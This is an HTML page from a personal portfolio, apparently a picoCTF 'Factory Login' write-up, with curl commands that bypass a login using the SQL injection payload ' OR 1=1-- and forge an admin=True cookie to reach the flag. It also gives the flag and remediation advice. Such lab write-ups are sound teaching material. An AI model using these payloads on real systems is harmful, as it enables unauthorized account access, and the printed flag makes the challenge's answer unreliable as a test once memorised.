@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Factory Login | Amidst CTF Write-up</title>
+  <link rel="icon" type="image/png" href="../assets/kafka-icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+  <nav class="navbar scrolled" id="navbar">
+    <div class="nav-container">
+      <a href="../index.html#home" class="nav-logo">
+        <img src="../assets/kafka-icon.png" alt="Logo" class="nav-icon">
+        <span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span>
+      </a>
+      <ul class="nav-menu">
+        <li><a href="../index.html#home">Home</a></li>
+        <li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#skills">Skills</a></li>
+        <li><a href="../index.html#certifications">Certs</a></li>
+        <li><a href="../index.html#ctf" class="active">CTF</a></li>
+        <li><a href="../index.html#bugbounty">Bug Bounty</a></li>
+        <li><a href="../index.html#labs">Labs</a></li>
+        <li><a href="../index.html#contact">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <section class="writeup-header">
+    <div class="container">
+      <a href="../index.html#ctf" class="writeup-back"><i class="fas fa-arrow-left"></i> Back to Write-ups</a>
+      <h1>Factory Login</h1>
+      <div class="writeup-meta">
+        <span class="ctf-category web">Web Exploitation</span>
+        <span class="ctf-difficulty easy">Easy</span>
+        <span style="color: var(--text-muted); font-size: 0.85rem;"><i class="fas fa-flag" style="margin-right:5px;"></i>picoCTF</span>
+      </div>
+    </div>
+  </section>
+
+  <section class="writeup-body">
+    <div class="container">
+      <div class="writeup-content">
+        <h2 id="challenge-info">Challenge Info</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>Factory Login</td>
+</tr>
+<tr>
+<td>Category</td>
+<td>Web Exploitation</td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>picoCTF</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>http://fickle-tempest.picoctf.net:62791/</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Description:</strong>
+The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at?</p>
+<hr />
+<h2 id="solution">Solution</h2>
+<h3 id="step-1-explore-the-login-page">Step 1: Explore the Login Page</h3>
+<p>The website is a Flask app (Werkzeug/Python) with a simple login form that posts to <code>/login</code>.</p>
+<pre><code class="language-bash">curl -s http://fickle-tempest.picoctf.net:62791/
+</code></pre>
+<p>No hidden comments, no linked scripts — just a straightforward login form with <code>user</code> and <code>password</code> fields.</p>
+<hr />
+<h3 id="step-2-sql-injection-to-bypass-login">Step 2: SQL Injection to Bypass Login</h3>
+<p>We need to login as "Joe" but don't know the password. Let's try SQL injection. The classic <code>' OR 1=1--</code> payload tells the database "accept any password":</p>
+<pre><code class="language-bash">curl -s -v -X POST http://fickle-tempest.picoctf.net:62791/login \
+  -d &quot;user=joe&amp;password=' OR 1=1--&quot; 2&gt;&amp;1
+</code></pre>
+<p><strong>Response headers:</strong></p>
+<pre><code>HTTP/1.1 302 FOUND
+Location: /flag
+Set-Cookie: password=&quot;' OR 1=1--&quot;; Path=/
+Set-Cookie: username=joe; Path=/
+Set-Cookie: admin=False; Path=/
+</code></pre>
+<p>The SQL injection works — the server redirects us to <code>/flag</code>. But notice the cookies: the server sets <code>admin=False</code>. This means there's a second check we need to bypass.</p>
+<hr />
+<h3 id="step-3-cookie-manipulation-set-admintrue">Step 3: Cookie Manipulation — Set admin=True</h3>
+<p>The server uses a plain-text cookie <code>admin=False</code> for authorization. Since cookies are stored on the client side, we can simply change it to <code>True</code>:</p>
+<pre><code class="language-bash">curl -s -b &quot;username=joe; password=' OR 1=1--; admin=True&quot; \
+  http://fickle-tempest.picoctf.net:62791/flag
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code class="language-html">&lt;p style=&quot;text-align:center; font-size:30px;&quot;&gt;
+  &lt;b&gt;Flag&lt;/b&gt;: &lt;code&gt;picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}&lt;/code&gt;
+&lt;/p&gt;
+</code></pre>
+<hr />
+<h2 id="flag">Flag</h2>
+<pre><code>picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
+</code></pre>
+<hr />
+<h2 id="vulnerabilities-exploited">Vulnerabilities Exploited</h2>
+<h3 id="1-sql-injection-authentication-bypass">1. SQL Injection (Authentication Bypass)</h3>
+<p>The server constructs a SQL query by directly inserting user input without sanitization. Something like:</p>
+<pre><code class="language-sql">SELECT * FROM users WHERE username='joe' AND password='' OR 1=1--'
+</code></pre>
+<p>The <code>' OR 1=1--</code> payload:
+- <code>'</code> closes the password string
+- <code>OR 1=1</code> makes the condition always true
+- <code>--</code> comments out the rest of the query</p>
+<p>This returns all users, effectively bypassing the password check.</p>
+<h3 id="2-insecure-cookie-based-authorization">2. Insecure Cookie-Based Authorization</h3>
+<p>The server stores the admin privilege in a plain-text cookie (<code>admin=False</code>) and trusts the client to not modify it. Since cookies are fully controlled by the client, changing <code>False</code> to <code>True</code> is trivial.</p>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li>
+<p><strong>Always use parameterized queries.</strong> Never concatenate user input into SQL queries. Use prepared statements or ORM frameworks to prevent SQL injection.</p>
+</li>
+<li>
+<p><strong>Never trust client-side data for authorization.</strong> Storing admin privileges in a cookie is like writing "VIP" on your own wristband. Authorization checks must be done server-side, using signed sessions or tokens (like JWT) that the client cannot forge.</p>
+</li>
+<li>
+<p><strong>Two vulnerabilities, one exploit chain.</strong> This challenge demonstrates how multiple weak points can be chained together. SQL injection alone got us to the flag page, but we also needed cookie manipulation to get admin access. In real-world pentesting, exploit chains like this are common.</p>
+</li>
+<li>
+<p><strong>Cookies should be signed or encrypted.</strong> If you must store data in cookies, use a framework's built-in signed cookie mechanism (like Flask's <code>session</code>) so the server can detect tampering. Better yet, store sensitive data server-side and only give the client a session ID.</p>
+</li>
+</ol>
+      </div>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <p class="footer-logo"><span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span></p>
+        <p class="footer-copy">&copy; 2026 Amidst. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
